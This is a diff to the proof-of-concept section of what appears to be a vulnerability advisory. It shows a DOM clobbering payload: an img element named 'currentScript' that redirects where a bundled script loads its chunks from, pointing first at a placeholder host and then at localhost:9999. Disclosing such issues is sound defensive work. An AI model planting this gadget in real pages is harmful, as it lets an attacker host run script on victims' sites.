@@ -40,19 +40,17 @@ URL: Self hosted
 
 ## PoC
 
+
 ```
-<!doctype html>
-  <html lang="en"><head><meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width,initial-scale=1.0">
-  <title>Document</title>
-</head>
-<body>
-  <div id="root"><img name="currentScript" src="https://xxx.xxx.xxx">
-  <script defer src="./dist/main.bundle.js"></script>
-  </div>
-</body>
-</html>
+<!--Library-->
+<script defer src="./dist/main.bundle.js"></script>
+<!--Library-->
+
+<!--Payload-->
+<div id="root"><img name="currentScript" src="https://localhost:9999">
+<!--Payload-->
+```
+
 ```
 
 The `rspack.config.js` to generate the bundle can be found below. 
